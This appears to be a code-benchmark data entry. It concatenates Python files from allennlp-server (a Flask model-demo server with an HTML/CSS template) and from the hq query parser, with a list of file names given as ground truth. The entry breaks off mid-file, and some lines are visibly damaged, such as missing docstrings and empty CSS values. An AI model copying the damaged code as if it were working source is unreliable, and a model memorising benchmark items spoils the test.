        "content": "'allennlp-server/allennlp_server/commands/server_simple.py'\n:\nimport argparse\nimport json\nimport logging\nimport os\nimport sys\nfrom string import Template\nfrom typing import List, Callable, Optional, Any, Iterable, Dict\n\nfrom allennlp.commands import Subcommand\nfrom allennlp.common import JsonDict\nfrom allennlp.common.checks import check_for_gpu\nfrom allennlp.predictors import Predictor\nfrom flask import Flask, request, Response, jsonify, send_file, send_from_directory\nfrom flask_cors import CORS\nfrom gevent.pywsgi import WSGIServer\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass ServerError(Exception):\n    def __init__(\n        self, message: str, status_code: int = 400, payload: Optional[Iterable[Any]] = None\n    ) -> None:\n        super().__init__(self)\n        self.message = message\n        self.status_code = status_code\n        self.payload = payload\n\n    def to_dict(self) -> Dict[Any, Any]:\n        error_dict = dict(self.payload or ())\n        error_dict[\"message\"] = self.message\n        return error_dict\n\n\ndef make_app(\n    predictor: Predictor,\n    field_names: List[str] = None,\n    static_dir: str = None,\n    sanitizer: Callable[[JsonDict], JsonDict] = None,\n    title: str = \"AllenNLP Demo\",\n) -> Flask:\n\n    if static_dir is not None:\n        static_dir = os.path.abspath(static_dir)\n        if not os.path.exists(static_dir):\n            logger.error(\"app directory %s does not exist, aborting\", static_dir)\n            sys.exit(-1)\n    elif static_dir is None and field_names is None:\n        print(\n            \"Neither build_dir nor field_names passed. Demo won't render on this port.\\n\"\n            \"You must use nodejs + react app to interact with the server.\"\n        )\n\n    app = Flask(__name__)\n\n    @app.errorhandler(ServerError)\n    def handle_invalid_usage(error: ServerError) -> Response:\n        response = jsonify(error.to_dict())\n        response.status_code = error.status_code\n        return response\n\n    @app.route(\"/\")\n    def index() -> Response:\n        if static_dir is not None:\n            return send_file(os.path.join(static_dir, \"index.html\"))\n        else:\n            html = _html(title, field_names or [])\n            return Response(response=html, status=200)\n\n    @app.route(\"/predict\", methods=[\"POST\", \"OPTIONS\"])\n    def predict() -> Response:\n\n        if request.method == \"OPTIONS\":\n            return Response(response=\"\", status=200)\n\n        data = request.get_json()\n\n        prediction = predictor.predict_json(data)\n        if sanitizer is not None:\n            prediction = sanitizer(prediction)\n\n        log_blob = {\"inputs\": data, \"outputs\": prediction}\n        logger.info(\"prediction: %s\", json.dumps(log_blob))\n\n        return jsonify(prediction)\n\n    @app.route(\"/predict_batch\", methods=[\"POST\", \"OPTIONS\"])\n    def predict_batch() -> Response:\n\n        if request.method == \"OPTIONS\":\n            return Response(response=\"\", status=200)\n\n        data = request.get_json()\n\n        prediction = predictor.predict_batch_json(data)\n        if sanitizer is not None:\n            prediction = [sanitizer(p) for p in prediction]\n\n        return jsonify(prediction)\n\n    @app.route(\"/<path:path>\")\n    def static_proxy(path: str) -> Response:\n        if static_dir is not None:\n            return send_from_directory(static_dir, path)\n        else:\n            raise ServerError(\"static_dir not specified\", 404)\n\n    return app\n\n\ndef _get_predictor(args: argparse.Namespace) -> Predictor:\n    check_for_gpu(args.cuda_device)\n    return Predictor.from_path(\n        args.archive_path,\n        predictor_name=args.predictor,\n        cuda_device=args.cuda_device,\n        overrides=args.overrides,\n    )\n\n\n@Subcommand.register(\"serve\")\nclass SimpleServer(Subcommand):\n    def add_subparser(self, parser: argparse._SubParsersAction) -> argparse.ArgumentParser:\n        description =\n        subparser = parser.add_parser(\n            self.name,\n            description=description,\n            help=\"Serve up a simple model.\",\n        )\n\n        subparser.add_argument(\n            \"--archive-path\",\n            type=str,\n            required=True,\n            help=\"path to trained archive file\",\n        )\n\n        subparser.add_argument(\"--predictor\", type=str, help=\"registered name of predictor\")\n\n        subparser.add_argument(\n            \"--cuda-device\", type=int, default=-1, help=\"id of GPU to use (if any)\"\n        )\n\n        subparser.add_argument(\n            \"-o\",\n            \"--overrides\",\n            type=str,\n            default=\"\",\n            help=\"a JSON structure used to override the experiment configuration\",\n        )\n\n        subparser.add_argument(\n            \"--static-dir\", type=str, help=\"serve index.html from this directory\"\n        )\n\n        subparser.add_argument(\n            \"--title\",\n            type=str,\n            help=\"change the default page title\",\n            default=\"AllenNLP Demo\",\n        )\n\n        subparser.add_argument(\n            \"--field-name\",\n            type=str,\n            action=\"append\",\n            dest=\"field_names\",\n            metavar=\"FIELD_NAME\",\n            help=\"field names to include in the demo\",\n        )\n\n        subparser.add_argument(\n            \"--host\",\n            type=str,\n            default=\"127.0.0.1\",\n            help=\"interface to serve the demo on\",\n        )\n\n        subparser.add_argument(\n            \"-p\", \"--port\", type=int, default=8000, help=\"port to serve the demo on\"\n        )\n\n        subparser.set_defaults(func=serve)\n\n        return subparser\n\n\ndef serve(args: argparse.Namespace) -> None:\n    predictor = _get_predictor(args)\n\n    app = make_app(\n        predictor=predictor,\n        field_names=args.field_names,\n        static_dir=args.static_dir,\n        title=args.title,\n    )\n    CORS(app)\n\n    http_server = WSGIServer((args.host, args.port), app)\n    print(f\"Model loaded, serving demo on http://{args.host}:{args.port}\")\n    http_server.serve_forever()\n\n\n\n\n\n\n\n_PAGE_TEMPLATE = Template(\n    \"\"\"\n<html>\n    <head>\n        <title>\n            $title\n        </title>\n        <style>\n            $css\n        </style>\n    </head>\n    <body>\n        <div class=\"pane-container\">\n            <div class=\"pane model\">\n                <div class=\"pane__left model__input\">\n                    <div class=\"model__content\">\n                        <h2><span>$title</span></h2>\n                        <div class=\"model__content\">\n                            $inputs\n                            <div class=\"form__field form__field--btn\">\n                                <button type=\"button\" class=\"btn btn--icon-disclosure\" onclick=\"predict()\">\n                                    Predict\n                                </button>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n                <div class=\"pane__right model__output model__output--empty\">\n                    <div class=\"pane__thumb\"></div>\n                    <div class=\"model__content\">\n                        <div id=\"output\" class=\"output\">\n                            <div class=\"placeholder\">\n                                <div class=\"placeholder__content\">\n                                    <p>Run model to view results</p>\n                                </div>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </body>\n    <script>\n    function predict() {\n        var quotedFieldList = $qfl;\n        var data = {};\n        quotedFieldList.forEach(function(fieldName) {\n            data[fieldName] = document.getElementById(\"input-\" + fieldName).value;\n        })\n\n        var xhr = new XMLHttpRequest();\n        xhr.open('POST', 'predict');\n        xhr.setRequestHeader('Content-Type', 'application/json');\n        xhr.onload = function() {\n            if (xhr.status == 200) {\n                // If you want a more impressive visualization than just\n                // outputting the raw JSON, change this part of the code.\n                var htmlResults = \"<pre>\" + JSON.stringify(JSON.parse(xhr.responseText), null, 2) + \"</pre>\";\n\n                document.getElementById(\"output\").innerHTML = htmlResults;\n            }\n        };\n        xhr.send(JSON.stringify(data));\n    }\n    </script>\n</html>\n\n        <div class=\"form__field\">\n            <label for=\"input-$field_name\">$field_name</label>\n            <input type=\"text\" id=\"input-$field_name\" type=\"text\" required value placeholder=\"input goes here\">\n        </div>\n\nbody,\nhtml {\n  min-width: 48em;\n  background:\n  font-size: 16px\n}\n\n* {\n  font-family: sans-serif;\n  color:\n}\n\nsection {\n  background:\n}\n\ncode,\ncode span,\npre,\n.output {\n  font-family: 'Roboto Mono', monospace!important\n}\n\ncode {\n  background:\n}\n\nli,\np,\ntd,\nth {\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  font-size: 1.125em;\n  line-height: 1.5em;\n  margin: 1.2em 0\n}\n\npre {\n  margin: 2em 0\n}\n\nh1,\nh2 {\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  font-weight: 300\n}\n\nh2 {\n  font-size: 2em;\n  color: rgba(35, 35, 35, .75)\n}\n\nimg {\n  max-width: 100%\n}\n\nhr {\n  display: block;\n  border: none;\n  height: .375em;\n  background:\n}\n\nblockquote,\nhr {\n  margin: 2.4em 0\n}\n\n.btn {\n  text-decoration: none;\n  cursor: pointer;\n  text-transform: uppercase;\n  font-size: 1em;\n  margin: 0;\n  -moz-appearance: none;\n  -webkit-appearance: none;\n  border: none;\n  color:\n  display: block;\n  background:\n  padding: .9375em 3.625em;\n  -webkit-transition: background-color .2s ease, opacity .2s ease;\n  transition: background-color .2s ease, opacity .2s ease\n}\n\n.btn.btn--blue {\n  background:\n}\n\n.btn:focus,\n.btn:hover {\n  background:\n  outline: 0\n}\n\n.btn:focus {\n  box-shadow: 0 0 1.25em rgba(50, 50, 150, .05)\n}\n\n.btn:active {\n  opacity: .66;\n  background:\n  -webkit-transition-duration: 0s;\n  transition-duration: 0s\n}\n\n.btn:disabled,\n.btn:disabled:active,\n.btn:disabled:hover {\n  cursor: default;\n  background:\n}\n\nform {\n  display: block\n}\n\n.form__field {\n  -webkit-transition: margin .2s ease;\n  transition: margin .2s ease\n}\n\n.form__field+.form__field {\n  margin-top: 2.5em\n}\n\n.form__field label {\n  display: block;\n  font-weight: 600;\n  font-size: 1.125em\n}\n\n.form__field label+* {\n  margin-top: 1.25em\n}\n\n.form__field input[type=text],\n.form__field textarea {\n  -moz-appearance: none;\n  -webkit-appearance: none;\n  width: 100%;\n  font-size: 1em;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  padding: .8125em 1.125em;\n  color:\n  border: .125em solid\n  display: block;\n  box-sizing: border-box;\n  -webkit-transition: background-color .2s ease, color .2s ease, border-color .2s ease, opacity .2s ease;\n  transition: background-color .2s ease, color .2s ease, border-color .2s ease, opacity .2s ease\n}\n\n.form__field input[type=text]::-webkit-input-placeholder,\n.form__field textarea::-webkit-input-placeholder {\n  color:\n}\n\n.form__field input[type=text]:-moz-placeholder,\n.form__field textarea:-moz-placeholder {\n  color:\n}\n\n.form__field input[type=text]::-moz-placeholder,\n.form__field textarea::-moz-placeholder {\n  color:\n}\n\n.form__field input[type=text]:-ms-input-placeholder,\n.form__field textarea:-ms-input-placeholder {\n  color:\n}\n\n.form__field input[type=text]:focus,\n.form__field textarea:focus {\n  outline: 0;\n  border-color:\n  box-shadow: 0 0 1.25em rgba(50, 50, 150, .05)\n}\n\n.form__field textarea {\n  resize: vertical;\n  min-height: 8.25em\n}\n\n.form__field .btn {\n  -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  user-select: none;\n  -webkit-touch-callout: none\n}\n\n.form__field--btn {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: -webkit-flex;\n  display: flex;\n  -webkit-flex-direction: row;\n  -ms-flex-direction: row;\n  -webkit-box-orient: horizontal;\n  -webkit-box-direction: normal;\n  flex-direction: row;\n  -webkit-justify-content: flex-end;\n  -ms-justify-content: flex-end;\n  -webkit-box-pack: end;\n  -ms-flex-pack: end;\n  justify-content: flex-end\n}\n\n@media screen and (max-height:760px) {\n  .form__instructions {\n    margin: 1.875em 0 1.125em\n  }\n  .form__field:not(.form__field--btn)+.form__field:not(.form__field--btn) {\n    margin-top: 1.25em\n  }\n}\n\nbody,\nhtml {\n  width: 100%;\n  height: 100%;\n  margin: 0;\n  padding: 0;\n  font-family: 'Source Sans Pro', sans-serif\n}\n\nh1 {\n  font-weight: 300\n}\n\n.model__output {\n  background:\n}\n\n.model__output.model__output--empty {\n  background: 0 0\n}\n\n.placeholder {\n  width: 100%;\n  height: 100%;\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: -webkit-flex;\n  display: flex;\n  -webkit-align-items: center;\n  -ms-flex-align: center;\n  -webkit-box-align: center;\n  align-items: center;\n  -webkit-justify-content: center;\n  -ms-justify-content: center;\n  -webkit-box-pack: center;\n  -ms-flex-pack: center;\n  justify-content: center;\n  -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  user-select: none;\n  -webkit-touch-callout: none;\n  cursor: default\n}\n\n.placeholder .placeholder__content {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: -webkit-flex;\n  display: flex;\n  -webkit-flex-direction: column;\n  -ms-flex-direction: column;\n  -webkit-box-orient: vertical;\n  -webkit-box-direction: normal;\n  flex-direction: column;\n  -webkit-align-items: center;\n  -ms-flex-align: center;\n  -webkit-box-align: center;\n  align-items: center;\n  text-align: center\n}\n\n.placeholder svg {\n  display: block\n}\n\n.placeholder svg.placeholder__empty,\n.placeholder svg.placeholder__error {\n  width: 6em;\n  height: 3.625em;\n  fill:\n  margin-bottom: 2em\n}\n\n.placeholder svg.placeholder__error {\n  width: 4.4375em;\n  height: 4em\n}\n\n.placeholder p {\n  font-size: 1em;\n  margin: 0;\n  padding: 0;\n  color:\n}\n\n.placeholder svg.placeholder__working {\n  width: 3.4375em;\n  height: 3.4375em;\n  -webkit-animation: working 1s infinite linear;\n  animation: working 1s infinite linear\n}\n\n@-webkit-keyframes working {\n  0% {\n    -webkit-transform: rotate(0deg)\n  }\n  100% {\n    -webkit-transform: rotate(360deg)\n  }\n}\n\n@keyframes working {\n  0% {\n    -webkit-transform: rotate(0deg);\n    -ms-transform: rotate(0deg);\n    transform: rotate(0deg)\n  }\n  100% {\n    -webkit-transform: rotate(360deg);\n    -ms-transform: rotate(360deg);\n    transform: rotate(360deg)\n  }\n}\n\n.model__content {\n  padding: 1.875em 2.5em;\n  margin: auto;\n  -webkit-transition: padding .2s ease;\n  transition: padding .2s ease\n}\n\n.model__content:not(.model__content--srl-output) {\n  max-width: 61.25em\n}\n\n.model__content h2 {\n  margin: 0;\n  padding: 0;\n  font-size: 1em\n}\n\n.model__content h2 span {\n  font-size: 2em;\n  color: rgba(35, 35, 35, .75)\n}\n\n.model__content h2 .tooltip,\n.model__content h2 span {\n  vertical-align: top\n}\n\n.model__content h2 span+.tooltip {\n  margin-left: .4375em\n}\n\n.model__content>h2:first-child {\n  margin: -.25em 0 0 -.03125em\n}\n\n.model__content__summary {\n  font-size: 1em;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  padding: 1.25em;\n  background:\n}\n\n@media screen and (min-height:800px) {\n  .model__content {\n    padding-top: 4.6vh;\n    padding-bottom: 4.6vh\n  }\n}\n\n.pane-container {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: -webkit-flex;\n  display: flex;\n  -webkit-flex-direction: column;\n  -ms-flex-direction: column;\n  -webkit-box-orient: vertical;\n  -webkit-box-direction: normal;\n  flex-direction: column;\n  height: 100%\n}\n\n.pane {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: -webkit-flex;\n  display: flex;\n  -webkit-flex-direction: row;\n  -ms-flex-direction: row;\n  -webkit-box-orient: horizontal;\n  -webkit-box-direction: normal;\n  flex-direction: row;\n  position: relative;\n  -webkit-box-flex: 2;\n  -webkit-flex: 2;\n  -ms-flex: 2;\n  flex: 2;\n  height: auto;\n  min-height: 100%;\n  min-height: 34.375em\n}\n\n.pane__left,\n.pane__right {\n  width: 100%;\n  height: 100%;\n  -webkit-align-self: stretch;\n  -ms-flex-item-align: stretch;\n  align-self: stretch;\n  min-width: 24em;\n  min-height: 34.375em\n}\n\n.pane__left {\n  height: auto;\n  min-height: 100%\n}\n\n.pane__right {\n  width: 100%;\n  overflow: auto;\n  height: auto;\n  min-height: 100%\n}\n\n.pane__right .model__content.model__content--srl-output {\n  display: inline-block;\n  margin: auto\n}\n\n.pane__thumb {\n  height: auto;\n  min-height: 100%;\n  margin-left: -.625em;\n  position: absolute;\n  width: 1.25em\n}\n\n.pane__thumb:after {\n  display: block;\n  position: absolute;\n  height: 100%;\n  top: 0;\n  content: \"\";\n  width: .25em;\n  background:\n  left: .5em\n}\n\n    Returns bare bones HTML for serving up an input form with the\n    specified fields that can render predictions from the configured model.\n    \"\"\"\n    inputs = \"\".join(\n        _SINGLE_INPUT_TEMPLATE.substitute(field_name=field_name) for field_name in field_names\n    )\n\n    quoted_field_names = (f\"'{field_name}'\" for field_name in field_names)\n    quoted_field_list = f\"[{','.join(quoted_field_names)}]\"\n\n    return _PAGE_TEMPLATE.substitute(title=title, css=_CSS, inputs=inputs, qfl=quoted_field_list)\n\n'allennlp-server/allennlp_server/commands/__init__.py'\n:from allennlp_server.commands.server_simple import SimpleServer\n\n'allennlp-server/allennlp_server/__init__.py'\n:import allennlp_server.commands\n",
        "gt": [
            "'allennlp-server/allennlp_server/commands/server_simple.py'",
            "'allennlp-server/allennlp_server/commands/__init__.py'",
            "'allennlp-server/allennlp_server/__init__.py'"
        ]
    },
    {
        "files": [
            "'hq/hq/hquery/hquery_processor.py'",
            "'hq/hq/hquery/computed_constructors/json_array.py'",
            "'hq/test/hquery/test_name_tests.py'"
        ],
        "content": "'hq/hq/hquery/hquery_processor.py'\n:import re\n\nfrom hq.hquery.computed_constructors.html_attribute import ComputedHtmlAttributeConstructor\nfrom hq.hquery.computed_constructors.html_element import ComputedHtmlElementConstructor\nfrom hq.hquery.computed_constructors.json_array import ComputedJsonArrayConstructor\nfrom hq.hquery.computed_constructors.json_hash import ComputedJsonHashConstructor\nfrom hq.hquery.evaluation_in_context import evaluate_in_context\nfrom hq.hquery.location_path import LocationPath\n\nfrom .tokens import *\nfrom ..soup_util import debug_dump_long_string\nfrom ..verbosity import verbose_print\n\n\ndef _is_name_test_predecessor(token):\n    return any(isinstance(token, clazz) for clazz in (AxisToken, SlashToken, DoubleSlashToken))\n\n\ndef _pick_token_based_on_numeric_context(parse_interface, value, previous_token, numeric_class, other_class):\n    numeric_predecessors = [CloseSquareBraceToken,\n                            CloseParenthesisToken,\n                            LiteralNumberToken,\n                            NameTestToken,\n                            VariableToken]\n    if any(isinstance(previous_token, token_class) for token_class in numeric_predecessors):\n        return numeric_class(parse_interface, value)\n    else:\n        return other_class(parse_interface, value)\n\n\ndef _pick_token_for_and_or_or(parse_interface, value, previous_token):\n    if previous_token is None or _is_name_test_predecessor(previous_token):\n        return NameTestToken(parse_interface, value)\n    elif value == 'or':\n        return OrOperatorToken(parse_interface, value)\n    else:\n        return AndOperator(parse_interface, value)\n\n\ndef _pick_token_for_asterisk(parse_interface, value, previous_token):\n    return _pick_token_based_on_numeric_context(parse_interface,\n                                                value,\n                                                previous_token,\n                                                MultiplyOperatorToken,\n                                                NodeTestToken)\n\n\ndef _pick_token_for_div_or_mod(parse_interface, value, previous_token):\n    return _pick_token_based_on_numeric_context(parse_interface,\n                                                value,\n                                                previous_token,\n                                                DivOrModOperatorToken,\n                                                NameTestToken)\n\n\ndef _pick_token_for_computed_constructor_reserved_word(parse_interface, value, previous_token):\n    if _is_name_test_predecessor(previous_token):\n        return NameTestToken(parse_interface, value)\n    else:\n        return ConstructorReservedWordToken(parse_interface, value)\n\n\ndef _pick_token_for_if_or_else(parse_interface, value, previous_token):\n    if _is_name_test_predecessor(previous_token):\n        return NameTestToken(parse_interface, value)\n    else:\n        return IfElseToken(parse_interface, value)\n\n\ndef _pick_token_for_flwor_reserved_word(parse_interface, value, previous_token):\n    if _is_name_test_predecessor(previous_token):\n        return NameTestToken(parse_interface, value)\n    else:\n        return FlworReservedWordToken(parse_interface, value)\n\n\ndef _pick_token_for_to(parse_interface, value, previous_token):\n    return _pick_token_based_on_numeric_context(parse_interface,\n                                                value,\n                                                previous_token,\n                                                RangeOperatorToken,\n                                                NameTestToken)\n\n\n_all_axes = [value.token() for value in Axis] + [re.escape(a) for a in Axis.abbreviations()]\n\ntoken_config = [\n    (r'(//)', DoubleSlashToken),\n    (r'(/)', SlashToken),\n    (r'(\\[)', OpenSquareBraceToken),\n    (r'(\\])', CloseSquareBraceToken),\n    (r'({0})::'.format('|'.join(_all_axes)), AxisToken),\n    (r'(\\.\\.)', ParentNodeToken),\n    (r'(\\.)', ContextNodeToken),\n    (r'(\\))', CloseParenthesisToken),\n    (r'(=>)', UnionDecompositionToken),\n    (r'(!=|=)', EqualityOperatorToken),\n    (r'(`[^`]*`)', InterpolatedStringToken),\n    (r'(\"[^\"]*\")', LiteralStringToken),\n    (r\"('[^']*')\", LiteralStringToken),\n    (r'(\\d[\\d\\.]*)', LiteralNumberToken),\n    (r'(,)', CommaToken),\n    (r'(@)', AxisToken),\n    (r'(\\*)', _pick_token_for_asterisk),\n    (r'(->)', AbbreviatedFlworOperatorToken),\n    (r'(\\+|-)', AddOrSubtractOperatorToken),\n    (r'(<=|<|>=|>)', RelationalOperatorToken),\n    (r'(\\|)', UnionOperatorToken),\n    (r'\\$([_\\w][\\w_\\-]*)', VariableToken),\n    (r'(:=)', AssignmentOperatorToken),\n    (r'(for|let|return)(?!\\w)', _pick_token_for_flwor_reserved_word),\n    (r'(array|attribute|element|hash)(?!\\w)', _pick_token_for_computed_constructor_reserved_word),\n    (r'(node|text|comment)\\(\\)', NodeTestToken),\n    (r'(div|mod)(?![a-zA-Z])', _pick_token_for_div_or_mod),\n    (r'(and|or)(?![a-zA-Z])', _pick_token_for_and_or_or),\n    (r'(if|else)(?![a-zA-Z])', _pick_token_for_if_or_else),\n    (r'(to)(?![a-zA-Z])', _pick_token_for_to),\n    (r'([a-z][a-z\\-]*[a-z])\\(', FunctionCallToken),\n    (r'(\\()', OpenParenthesisToken),\n    (r'({[a-z]{1,3}(?::[^:]*)*:})', ComputedConstructorFiltersToken),\n    (r'(\\{)', OpenCurlyBraceToken),\n    (r'(\\})', CloseCurlyBraceToken),\n    (r'(\\w[\\w_]*)\\s*:', HashKeyToken),\n    (r'(\\w[\\w\\-]*)', NameTestToken),\n]\n\n\nclass ParseInterface:\n\n    def __init__(self, processor):\n        self.processor = processor\n\n    def advance(self, *expected_classes):\n        return self.processor.advance(*expected_classes)\n\n    def advance_if(self, *expected_classes):\n        return self.processor.advance_if(*expected_classes)\n\n    def computed_constructor(self, first_token):\n        return self.processor.parse_computed_constructor(first_token)\n\n    def expression(self, rbp=0):\n        return self.processor.expression(rbp)\n\n    def flwor(self, first_token):\n        return self.processor.parse_flwor(first_token)\n\n    def if_then_else(self):\n        return self.processor.parse_if_then_else()\n\n    def is_on(self, *token_classes):\n        return self.processor.token_is(*token_classes)\n\n    def location_path(self, first_token, root_expression=None):\n        return self.processor.parse_location_path(first_token, root_expression=root_expression)\n\n    def parse_in_new_processor(self, source):\n        return HqueryProcessor(source).parse()\n\n    def peek(self):\n        return self.processor.token\n\n\n\nclass HqueryProcessor():\n\n    token = None\n    next_token = None\n\n\n    def __init__(self, source, preserve_space=False):\n        self.source = source\n        self.preserve_space = preserve_space\n\n\n    def query(self, starting_node):\n        verbose_print(u'PARSING HQUERY \"{0}\"'.format(debug_dump_long_string(self.source)), indent_after=True)\n        expression_fn = self.parse()\n        verbose_print('EVALUATING HQUERY', indent_after=True, outdent_before=True)\n        result = evaluate_in_context(starting_node, expression_fn, preserve_space=self.preserve_space)\n        verbose_print('HQUERY FINISHED', outdent_before=True)\n        return result\n\n\n    def tokenize(self):\n        parse_interface = ParseInterface(self)\n        pattern = re.compile(r'\\s*(?:{0})'.format('|'.join([pattern for pattern, _ in token_config])))\n        previous_token = None\n\n        for matches in pattern.findall(self.source):\n            index, value = next((i, group) for i, group in enumerate(list(matches)) if bool(group))\n            if value is None:\n                raise SyntaxError(\"unknown token\")\n            this_token = token_config[index][1](parse_interface, value=value, previous_token=previous_token)\n            yield this_token\n            previous_token = this_token\n\n        yield EndToken(parse_interface)\n\n\n    def token_is(self, *token_classes):\n        return any(isinstance(self.token, clz) for clz in token_classes)\n\n\n    def advance_if(self, *expected_classes):\n        result = None\n\n        if self.token_is(expected_classes):\n            verbose_print('ParseInterface advancing over token {0}'.format(self.token))\n            result = self.token\n            self.token = self.next_token()\n\n        return result\n\n\n    def advance_over_name(self):\n        accept_token_that_looks_like_a_name_with_no_grammar_role_of_its_own = NameTestToken\n        return self.advance(accept_token_that_looks_like_a_name_with_no_grammar_role_of_its_own).value\n\n\n    def advance(self, *expected_classes):\n        result = self.advance_if(expected_classes)\n        if result is None:\n            class_names = ' or '.join([clz.__name__ for clz in expected_classes])\n            raise HquerySyntaxError('expected {0}; got {1}'.format(class_names, self.token.__class__.__name__))\n        return result\n\n\n    def parse(self):\n        generator = self.tokenize()\n        self.next_token = generator.__next__ if hasattr(generator, '__next__') else generator.next\n        self.token = self.next_token()\n        evaluation_fn = self.expression()\n        if not self.token_is(EndToken):\n            raise HquerySyntaxError('Unexpected token {0} beyond end of HQuery'.format(self.token))\n        return evaluation_fn\n\n\n    def parse_computed_array_constructor(self):\n        constructor = ComputedJsonArrayConstructor()\n        self.advance(OpenCurlyBraceToken)\n\n        if not isinstance(self.token, CloseCurlyBraceToken):\n            constructor.set_contents(self.expression())\n\n        self.advance(CloseCurlyBraceToken)\n        return constructor\n\n\n    def parse_computed_attribute_constructor(self):\n        constructor = ComputedHtmlAttributeConstructor(self.advance_over_name())\n        self.advance(OpenCurlyBraceToken)\n\n        if not isinstance(self.token, CloseCurlyBraceToken):\n            constructor.set_content(self.expression())\n\n        self.advance(CloseCurlyBraceToken)\n        return constructor\n\n\n    def parse_computed_constructor(self, first_token):\n        if not isinstance(first_token, ConstructorReservedWordToken):\n            raise HquerySyntaxError('Computed constructor parsing somehow triggered by {0}'.format(str(first_token)))\n\n        verbose_print('Parsing computed constructor \"{0}\"'.format(first_token.value), indent_after=True)\n        result = getattr(self, 'parse_computed_{0}_constructor'.format(first_token.value))()\n\n        verbose_print('Finished parsing computed constructor \"{0}\"'.format(first_token.value), outdent_before=True)\n        return result\n\n\n    def parse_computed_element_constructor(self):\n        constructor = ComputedHtmlElementConstructor(self.advance_over_name())\n        self.advance(OpenCurlyBraceToken)\n\n        if not isinstance(self.token, CloseCurlyBraceToken):\n            constructor.set_content(self.expression())\n\n        self.advance(CloseCurlyBraceToken)\n        return constructor\n\n\n    def parse_computed_hash_constructor(self):\n        constructor = ComputedJsonHashConstructor()\n        token = self.advance(ComputedConstructorFiltersToken, OpenCurlyBraceToken)\n\n        if isinstance(token, ComputedConstructorFiltersToken):\n            constructor.set_filters(token.value)\n            self.advance(OpenCurlyBraceToken)\n\n        if not isinstance(self.token, CloseCurlyBraceToken):\n            constructor.set_contents(self.expression())\n\n        self.advance(CloseCurlyBraceToken)\n        return constructor\n\n\n    def parse_if_then_else(self):\n        verbose_print('Parsing if/then/else condition', indent_after=True)\n        self.advance(OpenParenthesisToken)\n        condition = self.expression()\n        self.advance(CloseParenthesisToken)\n        verbose_print('Parsing if/then/else \"then\" clause', outdent_before=True, indent_after=True)\n        then = self.advance_over_name()\n        if then.lower() != 'then':\n            raise HquerySyntaxError('if/then/else expected \"then\" after condition; got \"{0}\"'.format(then))\n        then_expr = self.expression()\n        verbose_print('Parsing if/then/else \"else\" clause', outdent_before=True, indent_after=True)\n        self._cannot_eat_else_same_as_then_because_else_needs_lower_lbp_so_then_expr_knows_when_to_stop()\n        else_expr = self.expression()\n        verbose_print('Finished parsing if/then/else', outdent_before=True)\n\n        def evaluate():\n            if boolean(condition()):\n                return then_expr()\n            else:\n                return else_expr()\n\n        return evaluate\n\n\n    def parse_flwor(self, first_token):\n        verbose_print('Parsing FLWOR starting with {0}'.format(first_token), indent_after=True)\n\n        flwor = Flwor()\n        token = first_token\n        while True:\n            if isinstance(token, FlworReservedWordToken):\n                verbose_print('Parsing FLWOR \"{0}\" clause'.format(token.value))\n                getattr(self, 'parse_flwor_{0}'.format(token.value))(flwor)\n                if token.value == 'return':\n                    break\n            else:\n                raise HquerySyntaxError('Unexpected token {0} at beginning of FLWOR'.format(first_token))\n            token = self.advance_if(FlworReservedWordToken)\n            if token is None:\n                break\n\n        if flwor.return_expression is None:\n            raise HquerySyntaxError('no \"return\" clause at end of FLWOR')\n        verbose_print(lambda: 'Finished parsing FLWOR {0}'.format(flwor.debug_dump()), outdent_before=True)\n        return flwor\n\n\n    def parse_flwor_for(self, flwor):\n        variable_name = self.advance(VariableToken).value\n\n        in_keyword = self.advance_over_name()\n        if in_keyword.lower() != 'in':\n            raise HquerySyntaxError('FLWOR expected reserved word \"in,\" got \"{0}\"'.format(in_keyword))\n\n        iteration_expression = self.expression()\n\n        flwor.set_iteration_expression(variable_name, iteration_expression)\n\n\n    def parse_flwor_let(self, flwor):\n        variable_token = self.advance(VariableToken)\n        self.advance(AssignmentOperatorToken)\n        expression = self.expression(LBP.sequence)\n        flwor.append_let(variable_token.value, expression)\n\n        if self.advance_if(CommaToken):\n            self.parse_flwor_let(flwor)\n\n\n    def parse_flwor_return(self, flwor):\n        flwor.set_return_expression(self.expression(LBP.sequence))\n\n\n    def parse_location_path(self, first_token, root_expression=None):\n        verbose_print(\n            'Parsing location path {0} {1}'.format(\n                'starting with' if root_expression is None else 'rooted at <expr> followed by',\n                first_token\n            ),\n            indent_after=True\n        )\n\n        if isinstance(first_token, SlashToken):\n            axis, node_test = self.parse_location_path_node_test()\n            predicates = self.parse_location_path_predicates()\n            path = LocationPath(axis,\n                                node_test,\n                                predicates,\n                                absolute=(root_expression is None),\n                                root_expression=root_expression)\n        elif isinstance(first_token, DoubleSlashToken):\n            path = LocationPath(Axis.descendant_or_self,\n                                NodeTest('node'),\n                                [],\n                                absolute=(root_expression is None),\n                                root_expression=root_expression)\n            axis, node_test = self.parse_location_path_node_test()\n            predicates = self.parse_location_path_predicates()\n            path.append_step(axis, node_test, predicates)\n        elif isinstance(first_token, AxisToken):\n            _, node_test = self.parse_location_path_node_test()\n            predicates = self.parse_location_path_predicates()\n            path = LocationPath(first_token.axis, node_test, predicates)\n        elif isinstance(first_token, ParentNodeToken):\n            predicates = self.parse_location_path_predicates()\n            path = LocationPath(Axis.parent, NodeTest('node'), predicates)\n        elif isinstance(first_token, ContextNodeToken):\n            predicates = self.parse_location_path_predicates()\n            path = LocationPath(Axis.self, NodeTest('node'), predicates)\n        elif isinstance(first_token, OpenSquareBraceToken):\n            if root_expression is None:\n                raise HquerySyntaxError('a predicate (left brace) must follow an expression that yields a node set')\n            path = LocationPath(Axis.self,\n                                NodeTest('node'),\n                                self.parse_location_path_predicates(already_inside_brace=True),\n                                root_expression=root_expression)\n        else:\n            if not (isinstance(first_token, NameTestToken) or 